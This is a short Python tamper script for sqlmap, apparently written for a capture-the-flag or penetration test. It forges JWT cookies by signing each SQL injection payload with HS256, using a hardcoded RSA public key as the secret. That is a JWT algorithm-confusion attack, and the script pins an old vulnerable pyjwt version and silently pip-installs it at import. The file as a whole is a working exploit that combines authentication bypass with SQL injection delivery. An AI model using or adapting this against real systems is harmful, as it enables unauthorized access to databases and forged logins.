#!/usr/bin/env python3

import os
import datetime

try:
    import jwt
except ImportError:
    os.system("python -m pip install pyjwt==0.4.3 --no-cache-dir")
    import jwt

##
# NOTE: sqlmap custom tamper script related
from lib.core.data import kb
from lib.core.enums import PRIORITY
import logging
sqlmaplog = logging.getLogger("sqlmapLog")
__priority__ = PRIORITY.NORMAL


def dependencies():
    pass


def tamper(payload, **kwargs):
    sqlmaplog.info(f"[jwt_tamper.py] Sign payload: {payload}")
    PUB_KEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n"
    cookieval = jwt.encode({"username": payload, "pk": PUB_KEY, "iat": datetime.datetime.utcnow()},
                           PUB_KEY, algorithm="HS256").decode('UTF-8')
    sqlmaplog.debug(f"[jwt_tamper.py] jwt: {cookieval}")
    return cookieval
